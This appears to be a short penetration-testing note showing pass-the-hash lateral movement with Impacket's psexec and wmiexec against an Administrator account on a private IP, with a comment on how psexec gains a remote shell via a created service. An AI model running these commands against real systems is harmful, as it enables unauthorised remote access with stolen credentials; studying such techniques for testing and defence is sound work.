# Using PSExec will need 32 zeros and then the NTLM hash. It will write a file on the target, create a service and start it, retrieving a CLI. At exit it have a cleanup of these steps:
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f002..5abed1762964b  Administrator@10.0.0.2

# We can also use WMI on Impacket:
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f002..5abed1762964b Administrator@10.0.0.2
